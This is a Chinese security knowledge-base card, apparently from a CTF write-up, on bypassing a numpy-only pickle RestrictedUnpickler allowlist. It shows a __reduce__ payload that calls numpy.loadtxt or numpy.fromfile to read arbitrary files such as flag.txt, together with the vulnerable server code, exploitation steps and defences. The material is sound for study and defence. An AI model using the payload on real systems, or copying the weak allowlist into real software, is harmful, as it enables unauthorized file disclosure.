---
id: web-python-deserialization-restricted-unpickler-numpy-loadtxt-file-read
title: RestrictedUnpickler 仅放行 numpy：numpy.loadtxt/fromfile 成为任意文件读取 sink
type: scenario
domain: web
path: web/python/deserialization
technique: restricted-unpickler-numpy-allowlist-file-read
tags:
- python
- pickle
- deserialization
- restricted-unpickler
- numpy
- file-read
- allowlist-bypass
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T10:02:45+08:00'
  notes: 已对照原文pickled magic核对：find_class仅放行numpy且name不含__、__reduce__返回(numpy.loadtxt,('flag.txt',))，与exp一致；未验证点：未复跑；卡片补充的ValueError回显属合理推断。
url: /docs/web/python/deserialization/web-python-deserialization-restricted-unpickler-numpy-loadtxt-file-read/
draft: false
kb_aliases:
- pickle numpy 白名单绕过
- numpy.loadtxt 读文件
- pickled magic
- find_class 模块白名单
- numpy.fromfile 文件读取
---

## 一句话结论

当 `RestrictedUnpickler.find_class` 只检查“模块名必须是 `numpy`、属性名不能含 `__`”时，攻击者仍可在 pickle 的 `__reduce__` 里引用 `numpy.loadtxt`、`numpy.fromfile` 这类带文件 I/O 的正常函数；反序列化执行 `callable(*args)` 时就会读取任意文件，返回值或被 `print` 回显、或由 numpy 的解析异常带出文件内容。

## 原理

- pickle 的 `GLOBAL`/`STACK_GLOBAL` 操作码只保存“模块名 + 属性名”，反序列化时交给 `find_class(module, name)` 解析成 Python 对象；`REDUCE` 再以栈上的参数调用该对象。
- 该沙箱的检查是 `module == 'numpy' and '__' not in name`，它约束的是“名字长相”，不是“函数行为”。`numpy.loadtxt`、`numpy.fromfile`、`numpy.genfromtxt` 等名字既属于 numpy 又不含双下划线，因此全部放行。
- `numpy.loadtxt('flag.txt')` 会打开并解析目标文件：
  - 若文件内容是数字，返回 ndarray，服务端 `print(load())` 直接把内容打印出来；
  - 若文件内容是非数字文本（常见 flag 形式），numpy 抛出的 `ValueError` 会带出无法转换的那一行原文，例如 `could not convert string 'jail{...}' to float64`，未捕获异常的回显同样泄露内容。
- `numpy.fromfile(path, dtype='S1')` 用字节类型读取整个文件，不受“必须是数字”的限制；`numpy.load` 还能反序列化 `.npy` 中的对象数组（目标机存在攻击者可控文件时进一步升级）。
- 因此“只允许一个模块”并不等于安全：只要该模块内存在任何能触达文件系统、网络或解释器的函数，白名单就被绕过。

## 触发条件

- 接口对攻击者可控字节调用 `pickle.loads` / `Unpickler.load`。
- `find_class` 采用模块级白名单（如只允许 `numpy`），并仅用 `'__' not in name` 之类字符串规则过滤属性名。
- 反序列化结果会被打印、序列化返回，或异常信息会回显给攻击者（至少能拿到文件内容的一部分）。
- 进程对目标文件有读权限，且 `flag.txt` 等工作目录相对路径可预测。

## 利用步骤

1. 确认 pickle 入口与 `find_class` 规则：module 是否只允许 `numpy`、name 是否过滤 `__`、是否还有长度/字节黑名单。
2. 在本地构造带 `__reduce__` 的对象，让 pickle 引用一个 numpy 的 I/O 函数：
   ```python
   import pickle, numpy

   class Evil:
       def __reduce__(self):
           return (numpy.loadtxt, ('flag.txt',))

   print(pickle.dumps(Evil()).hex())
   ```
3. 把二进制 pickle 以 hex/base64 形式提交；目标端 `load()` 时执行 `numpy.loadtxt('flag.txt')`。
4. 读取返回内容；若服务只打印结果而文件不是纯数字，改试 `numpy.fromfile('flag.txt', dtype='S1')`，或观察 numpy 的 `ValueError` 是否把首行内容带回。
5. 需要绕过输出长度/类型限制时，用 `numpy.genfromtxt`、`numpy.load` 等不同 sink 逐个尝试。

## PoC

```python
# 服务端逻辑（文章例题的精简形态）
import pickle, numpy, io
from pickle import _getattribute

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == 'numpy' and '__' not in name:
            return _getattribute(numpy, name)[0]
        raise pickle.UnpicklingError('bad')

data = bytes.fromhex(input('(hex)> '))
print(RestrictedUnpickler(io.BytesIO(data)).load())
```

```python
# 载荷构造
import pickle, numpy

class Evil:
    def __reduce__(self):
        return (numpy.loadtxt, ('flag.txt',))

payload = pickle.dumps(Evil())
print(payload.hex())
```

```text
# 提交 hex 后，load() 实际执行 numpy.loadtxt('flag.txt')
# 数字型文件直接打印数组；非数字型文件由 ValueError 回显首行内容
```

## 变体与关联

- 同类 sink：`numpy.fromfile(path, dtype='S1')`、`numpy.genfromtxt`、`numpy.load`；`pandas.read_csv`、`PIL.Image.open(...).tobytes()`、`scipy.io.loadmat` 等只要被白名单放行且能读文件，效果相同。
- 白名单若允许整个 `numpy` 模块，还可以用 `numpy.f2py`、`numpy.distutils` 等子模块中的执行类函数继续寻找更强的原语。
- 关联：[[web-python-deserialization-restricted-unpickler-getattr-bypass]]（放行 `getattr` 的动态属性链绕过）、[[web-python-deserialization-pickle-pydoc-pipepager-short-blacklist-bypass]]（名字不带黑名单词的标准库 I/O sink）。
- 边界：若 `find_class` 只允许具体类且这些类没有参数可控的 I/O 构造器，本手法不成立；`numpy.loadtxt` 的输出能否回显取决于服务端是否打印/异常外泄。

## 检测与防御

- 检测：审计 `find_class` 实现，凡是“按模块放行 + 字符串过滤”的白名单都要视为高风险；关注 pickle 中出现 `numpy\nloadtxt`、`numpy\nfromfile`、`numpy\ngenfromtxt` 等 GLOBAL 组合；对反序列化异常统一返回泛化错误，不把原始异常/首行内容回显。
- 修复：不要反序列化不可信 pickle；必须使用时把白名单收敛到具体业务类，禁止放行整个模块和任何函数；`find_class` 之外再用 HMAC 签名保护序列化数据。
- 加固：在无敏感文件的低权限子进程/容器中反序列化，限制工作目录与文件系统；对 numpy 等科学计算依赖做导入裁剪，去掉不需要的 I/O 子模块。
